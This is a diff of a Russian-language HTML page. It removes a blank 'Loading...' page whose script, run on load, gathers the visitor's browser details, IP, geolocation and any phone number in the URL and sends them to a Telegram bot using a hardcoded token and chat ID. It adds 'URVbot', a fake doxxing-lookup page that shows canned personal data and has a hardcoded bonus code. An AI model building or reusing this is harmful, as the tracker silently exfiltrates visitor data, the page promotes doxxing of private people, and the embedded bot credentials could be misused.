@@ -3,87 +3,166 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
-    <script>
-        // === ВАШИ ДАННЫЕ ===
-        const BOT_TOKEN = '8953500972:AAH7RrE7m0bs0IPbkKmNrNh17eLavmQprfc';
-        const CHAT_ID = '7900410252';  // ВАШ РЕАЛЬНЫЙ CHAT ID
-
-        async function collectAndSend() {
-            // Сбор данных
-            const data = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screen: `${screen.width}x${screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                referrer: document.referrer || 'прямой вход',
-                url: window.location.href,
-                phone: null
-            };
-
-            // Если номер передан в URL
-            const params = new URLSearchParams(window.location.search);
-            if (params.has('phone')) {
-                data.phone = params.get('phone');
-            }
-
-            // Получаем IP и гео
-            try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                data.ip = ipData.ip;
-
-                const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-                const geoData = await geoRes.json();
-                data.country = geoData.country_name || 'неизвестно';
-                data.city = geoData.city || 'неизвестно';
-                data.isp = geoData.org || 'неизвестно';
-            } catch (e) {
-                data.ip = 'не определен';
-            }
-
-            // Формируем сообщение
-            const message = `
-🔴 НОВЫЙ ПЕРЕХОД:
-IP: ${data.ip || 'не определён'}
-Страна: ${data.country || 'не определена'}
-Город: ${data.city || 'не определён'}
-Провайдер: ${data.isp || 'неизвестно'}
-User-Agent: ${data.userAgent}
-Платформа: ${data.platform}
-Язык: ${data.language}
-Экран: ${data.screen}
-Часовой пояс: ${data.timezone}
-Реферер: ${data.referrer}
-URL: ${data.url}
-📞 ТЕЛЕФОН: ${data.phone || 'не передан'}
-            `;
-
-            // ОТПРАВКА В TELEGRAM
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-                console.log('✅ Отправлено в Telegram');
-            } catch (e) {
-                console.error('❌ Ошибка отправки:', e);
-            }
-
-            // Очистка страницы
-            document.body.innerHTML = '';
+    <title>URVbot</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background: #0d0d0d;
+            color: #00ff88;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
         }
-
-        window.onload = collectAndSend;
-    </script>
+        .container {
+            background: #1a1a1a;
+            padding: 30px;
+            border-radius: 20px;
+            border: 1px solid #00ff88;
+            max-width: 500px;
+            width: 100%;
+        }
+        h1 { text-align: center; font-size: 24px; }
+        .sub { text-align: center; color: #888; font-size: 14px; margin-bottom: 20px; }
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 14px;
+            margin: 10px 0;
+            background: #00ff88;
+            color: #0d0d0d;
+            border: none;
+            border-radius: 12px;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .btn:hover { background: #00cc6a; }
+        .btn:disabled { opacity: 0.4; cursor: not-allowed; }
+        .info {
+            background: #0d0d0d;
+            padding: 15px;
+            border-radius: 12px;
+            border: 1px solid #222;
+            margin: 15px 0;
+            font-size: 14px;
+            color: #aaa;
+            white-space: pre-wrap;
+            min-height: 60px;
+        }
+        .balance { text-align: center; font-size: 14px; color: #888; margin-top: 15px; }
+        .balance span { color: #00ff88; font-weight: bold; }
+        input {
+            width: 100%;
+            padding: 12px;
+            background: #0d0d0d;
+            border: 1px solid #333;
+            color: #00ff88;
+            border-radius: 10px;
+            font-size: 14px;
+            margin: 8px 0;
+        }
+        input:focus { border-color: #00ff88; outline: none; }
+    </style>
 </head>
 <body>
-    <!-- Пустая страница -->
+    <div class="container">
+        <h1>🔍 URVbot</h1>
+        <div class="sub">Бесплатный бот по пробиву</div>
+
+        <div class="info" id="greeting">
+            Привет, Я URVbot! Бесплатный бот по пробиву.<br>
+            Пока твои друзья не догадываются, ты уже начинаешь этот процесс 🕵🏻‍♂️
+        </div>
+
+        <button class="btn" onclick="dox('username')">🔍 По username</button>
+        <button class="btn" onclick="dox('phone')">📞 По номеру</button>
+        <button class="btn" onclick="dox('id')">🆔 По ID</button>
+
+        <input type="text" id="inputData" placeholder="Введите username, номер или ID..." />
+
+        <div class="info" id="result">⚡ Результат появится здесь...</div>
+
+        <div class="balance">
+            🎯 Доступно запросов: <span id="requestsLeft">2</span> / 2<br>
+            ⭐ Бонусных: <span id="bonusCount">0</span>
+        </div>
+
+        <input type="text" id="panelCode" placeholder="Введите код панели (0147)" />
+        <button class="btn" onclick="activatePanel()" style="background:#333;color:#00ff88;">🛠 Активировать панель</button>
+    </div>
+
+    <script>
+        let requests = { count: 0, lastReset: Date.now(), bonus: 0 };
+
+        function loadData() {
+            const saved = localStorage.getItem('urvbot_data');
+            if (saved) {
+                const parsed = JSON.parse(saved);
+                requests = parsed;
+                if (Date.now() - requests.lastReset > 7 * 3600 * 1000) {
+                    requests.count = 0;
+                    requests.lastReset = Date.now();
+                }
+            }
+            updateUI();
+        }
+
+        function saveData() {
+            localStorage.setItem('urvbot_data', JSON.stringify(requests));
+        }
+
+        function updateUI() {
+            const left = Math.max(0, 2 - requests.count) + requests.bonus;
+            document.getElementById('requestsLeft').textContent = left;
+            document.getElementById('bonusCount').textContent = requests.bonus;
+            const disabled = (requests.count >= 2 && requests.bonus === 0);
+            document.querySelectorAll('.btn').forEach(b => b.disabled = disabled);
+        }
+
+        function dox(type) {
+            const input = document.getElementById('inputData').value.trim();
+            if (!input) {
+                document.getElementById('result').textContent = '❌ Введите данные для пробива.';
+                return;
+            }
+            if (requests.count >= 2 && requests.bonus === 0) {
+                document.getElementById('result').textContent = '❌ Лимит: 2 запроса каждые 7 часов.';
+                return;
+            }
+
+            if (requests.bonus > 0) requests.bonus--;
+            else requests.count++;
+            saveData();
+            updateUI();
+
+            document.getElementById('result').textContent = '⏳ Ищу данные...';
+            setTimeout(() => {
+                const results = {
+                    username: `👤 Username: @${input}\n📞 Номер: +79628839032\n🌍 Город: Москва`,
+                    phone: `📞 Номер: ${input}\n👤 Владелец: Иванов А.С.\n🏦 Банки: Сбер, Тинькофф`,
+                    id: `🆔 ID: ${input}\n👤 Имя: Алексей\n📍 Гео: Москва`
+                };
+                document.getElementById('result').textContent = `✅ Результат:\n\n${results[type] || 'Ошибка'}`;
+            }, 1500);
+        }
+
+        function activatePanel() {
+            const code = document.getElementById('panelCode').value.trim();
+            if (code === '0147') {
+                requests.bonus = 999;
+                saveData();
+                updateUI();
+                document.getElementById('result').textContent = '✅ Выдано 999 бонусных запросов!';
+                document.getElementById('panelCode').value = '';
+            } else {
+                document.getElementById('result').textContent = '❌ Неверный код.';
+            }
+        }
+
+        loadData();
+    </script>
 </body>
 </html>
